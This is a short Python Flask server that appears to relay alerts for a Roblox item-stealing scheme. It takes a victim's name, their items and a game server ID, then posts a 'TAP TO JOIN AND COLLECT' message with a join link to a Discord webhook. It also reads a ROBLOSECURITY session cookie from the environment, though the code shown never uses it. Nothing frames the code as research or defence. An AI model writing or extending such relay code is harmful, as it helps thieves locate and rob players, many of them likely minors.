from flask import Flask, request
import requests
import os

app = Flask(__name__)

ROBLOSECURITY = os.environ.get("ROBLOSECURITY")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")

@app.route('/trigger', methods=['POST'])
def trigger():
    data = request.get_json()
    if not data:
        return "invalid", 400
    
    job_id = data.get("jobId")
    place_id = data.get("placeId")
    victim = data.get("victimName")
    items = data.get("items")
    
    join_link = f"https://www.roblox.com/games/{place_id}?gameInstanceId={job_id}"
    
    discord_msg = {
        "content": f"**TAP TO JOIN AND COLLECT**\nVictim: {victim}\nItems: {items}\n\n{join_link}"
    }
    
    if WEBHOOK_URL:
        requests.post(WEBHOOK_URL, json=discord_msg)
    
    return "ok", 200

@app.route('/')
def home():
    return "online", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
